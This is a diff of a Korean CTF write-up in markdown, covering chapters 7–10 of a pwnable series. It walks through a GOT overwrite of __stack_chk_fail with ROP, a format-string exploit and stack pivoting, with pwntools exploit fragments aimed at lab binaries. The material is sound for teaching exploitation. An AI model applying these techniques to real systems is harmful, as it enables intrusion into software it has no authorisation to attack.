@@ -190,12 +190,14 @@ write(4, payload)
 p.sendlineafter(b'> ', b'3')
 p.interactive()
 ```
+
 저는 `/bin/sh` 문자열 찾는 방법으로 `list(l.search(b'/bin/sh'))[0]`을 선호합니다. `/bin/sh` 찾는 방법을 잘 모르셨다면 이를 추천합니다. `one_gadget`을 사용하여도 무방하지만, `vm`에 `one_gadget`이 안 깔려있는 것을 보아 인텐이 아닌 것 같아 해당 방법으로 풀지는 않았습니다.
 
 --- 
 ### Chapter 7
 
 - 보호기법 분석
+
 ```bash
 [*] '/home/Wired_at_the_Vault/got'
     Arch:       amd64-64-little
@@ -207,9 +209,11 @@ p.interactive()
     IBT:        Enabled
     Stripped:   No
 ```
+
 `Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.
 
 - 코드 분석
+
 ```C
 #include <stdio.h>
 /*
@@ -258,13 +262,16 @@ int main(int argc, char *argv[]){
     }
 }
 ```
+
 모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴는 `wire` 배열에 접근하여 값을 쓰는 기능을 합니다. 이 때 `select`에 대한 검사가 없기 때문에 `oob` 취약점이 발생합니다. 그리고 `wire` 배열이 `bss`에 위치해있는 점, `Partial RELRO`인 점을 종합하면 `got overwrite`가 가능합니다. 2번 메뉴는 `startup` 함수를 실행합니다. `startup` 함수에서는 `bof`가 발생합니다.
 
 - 익스플로잇 설계
+
 카나리가 있기 때문에, 이를 알아내야 하는데 릭 벡터를 일차원적으로 찾을 수는 없습니다. 따라서 카나리를 변조해야만 다음 단계로 넘어갈 수 있습니다. 그런데 스택 프레임 내부의 카나리 값이 기존 카나리 값과 달라지면 `__stack_chk_fail` 함수를 호출합니다. 따라서 이 함수의 `got` 영역을 변조하고 의도적으로 호출하도록 설계합니다. `bof` 크기가 크기 때문에 `got overwrite`에서 체이닝을 고려할 필요는 없고 `ret` 주소로만 변조해도 충분합니다. 이러면 그냥 다음 어셈블리어 코드가 실행되므로 카나리 체크는 없는 것과 마찬가지입니다. `pop rdi ; ret` 가젯이 있기 때문에 `bof`를 이용하여 `puts`를 호출하여 `libc_base`를 얻고 `ROP`를 수행하여 `system('/bin/sh')`를 호출합니다.
 이 때 `sfp`의 값을 신경써주어야 합니다. `startup` 함수를 두 번 실행하기 때문에 두 번째 함수의 `leave ; ret`에 의해 첫 번째 `payload`의 `sfp` 값이 `rsp`가 됩니다. `system` 함수는 작동 중에 쓰기 과정이 있으므로 `rsp`의 근처의 주소가 쓰기 가능한 영역이어야 합니다. 즉 `sfp`를 바른 주소로 적어주어야 합니다. `rsp`가 음수 쪽으로 쓰기 불가능한 주소와 가까이 있다면 `system` 함수가 제대로 작동하지 않을 가능성이 있으므로 보통 `e.bss() + 0x800 or 0x900`를 많이 사용합니다. 아래 코드가 이해를 도울 것입니다.
 
 - 익스플로잇
+
 ```python
 from pwn import *
 
@@ -299,6 +306,7 @@ p.interactive()
 ### Chapter 8
 
 - 보호기법 분석
+
 ```bash
 [*] '/home/Awakening_in_the_Dark/fsb'
     Arch:       amd64-64-little
@@ -310,9 +318,11 @@ p.interactive()
     IBT:        Enabled
     Stripped:   No
 ```
+
 `Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.
 
 - 코드 분석
+
 ```C
 #include <stdio.h>
 #include <unistd.h>
@@ -388,12 +398,15 @@ int main(){
 
 }
 ```
+
 모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `printf(buf)` 코드가 있으므로 `fsb` 취약점이 발생합니다. 2번 메뉴에서 `(*(void (*)()) exitst_or_not)();`을 실행시켜줍니다. 3번 메뉴에서 `main` 함수를 종료시킵니다. `open_emergency_medicine`를 실행하면 `flag`를 읽을 수 있습니다. `flag`에 다음 챕터로 넘어갈 때 사용할 비밀번호가 있다고 유추할 수 있습니다.
 
 - 익스플로잇 설계
+
 `fsb` 취약점이 존재하면 다양한 방법으로 익스가 가능합니다. 이 문제는 `printf`의 출력을 참고하여`open_emergency_medicine`을 이용하는 방법, `main`의 `RET`을 조작하는 방법이 있고, `printf`의 출력을 이용하지 않고 쉘을 따는 방법이 있습니다. 세 번째 방법은 꽤나 복잡한 과정을 거치기에 이 글에서는 소개하지 않겠습니다만, 레이팅이 높은 CTF에서도 `Medium` 난이도의 문제로 종종 출제되는 기법이기 때문에 관심이 있으시다면 익혀두시는 것을 추천합니다(2024 BackdoorCTF의 [Merry Christmas](https://shielder.tistory.com/4)문제가 예시입니다.). 여기서는 출제자의 의도를 고려하여 `open_emergency_medicine`을 이용하는 방법을 선택하겠습니다.
 `fsb`가 발생하는 코드에서 `printf`가 `rdi`만 사용하므로 `rsi, rdx, r8, r9, r10, rsp, rsp + 8, rsp + 0x10...` 순서로 참조 가능합니다. 이 때 `rsi`가 `buf`의 주소를 가리키므로 `%p(혹은 %1$p)`로 `buf`의 주소를 알아낼 수 있습니다.
 `exitst_or_not`을 `open_emergency_medicine`의 주소로 변경한 후 2번 메뉴로 실행시켜줄 것입니다. 이를 위해서 `exitst_or_not`의 주소를 알아야 합니다. `buf`의 주소를 알기 때문에 `exitst_or_not`과 `buf`의 `offset`만 알아내면 됩니다.
+
 ```bash
 pwndbg> disass main
 Dump of assembler code for function main:
@@ -423,9 +436,11 @@ Dump of assembler code for function main:
    0x000000000040155b <+452>:   ret
 End of assembler dump.
 ```
+
 `init` 실행 후에 `&exist` 값을 넣어주는 것을 보아 `rbp - 0x118`이 `exitst_or_not`의 주소임을 알 수 있습니다. `memset`의 `rdi`에 `rbp-0x110`이 들어가는 것을 보아 `rbp-0x110`이 `buf`의 주소임을 알 수 있습니다. 따라서 `buf`의 주소에서 8을 빼면 `exitst_or_not`의 주소가 됩니다. 구하려고 하는 것들을 전부 구했으므로 `fsb`와 2번 메뉴를 이용해 `open_emergency_medicine`를 실행시켜 `flag`를 읽을 수 있습니다.
 
 - 익스플로잇
+
 ```python
 from pwn import *
 context.arch = 'amd64'
@@ -444,12 +459,14 @@ fsb(payload)
 p.sendlineafter(b'> ', b'2')
 p.interactive()
 ```
+
 `pwntools` 라이브러리에서 `fmtstr_payload`라는 좋은 함수를 제공하고 있습니다. 하지만 CTF나 실제 환경에서는 `payload`를 직접 작성해야 하는 경우가 많기 때문에 함수를 이용하는 것보단 직접 생각하여 짜는 것을 추천드립니다.
 
 ---
 ### Chapter 9
 
 - 보호기법 분석
+
 ```bash
 [*] '/home/On_the_Edge_of_Time/pivot'
     Arch:       amd64-64-little
@@ -461,9 +478,11 @@ p.interactive()
     IBT:        Enabled
     Stripped:   No
 ```
+
 카나리가 없고, `PIE`가 꺼져 있습니다.
 
 - 코드 분석
+
 ```C
 #include <stdio.h>
 #include <stdlib.h>
@@ -503,12 +522,15 @@ int main(void)
     return 0;
 }
 ```
+
 `main`에서 `bof` 취약점이 발생합니다. 그런데 `loop` 검사가 있기 때문에 `main`은 단 한 번만 호출할 수 있습니다. `gadget` 함수에서 유용한 가젯을 제공합니다.
 
 - 익스플로잇 설계
+
 `libc_base`를 알아내고 `system('/bin/sh')`를 실행시키기 위해서는 한 번의 `read`만으로는 부족합니다. 심지어 `main`에서의 `read`함수는 `0x70` 바이트만 읽기 때문에 길이가 부족합니다. 따라서 스택 피보팅을 이용하겠습니다. 스택 피보팅이란 쓰기 가능한 공간에 가짜 스택 프레임이 있다고 생각하고 `payload`를 작성하는 것입니다. `sfp` 조작으로 `rbp`를 변조할 수 있고, `leave ; ret` 가젯이 있기 때문에 결국 `rsp`를 변조할 수 있어 체이닝을 이어나갈 수 있습니다. 이 문제에 적용해보면, `rdx`가 `0x70`인 상태로 `read` 함수를 다시 호출하여 `0x70` 바이트 전체를 체이닝에 사용할 수 있도록 하는 식입니다. `leave ; ret` 가젯을 이용할 것을 고려하여 가짜 스택 프레임의 구성을 생각하며 `payload`를 짜줍니다. 이 때 쓰기 가능한 공간은 `PIE`가 꺼져 있으므로 `bss` 영역을 이용합니다.
 
 - 익스플로잇
+
 ```python
 from pwn import *
 from time import *
@@ -547,12 +569,14 @@ payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 p.send(payload)
 p.interactive()
 ```
+
 의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 익스 실행을 안정화시킵니다.
 
 ---
 ### Chapter 10
 
 - 보호기법 분석
+
 ```bash
 [*] '/home/The_Cure_Within_Reach/final'
     Arch:       amd64-64-little
@@ -564,6 +588,7 @@ p.interactive()
     IBT:        Enabled
     Stripped:   No
 ```
+
 `final` 파일은 모든 보호 기법이 적용되어 있습니다.
 
 ```bash
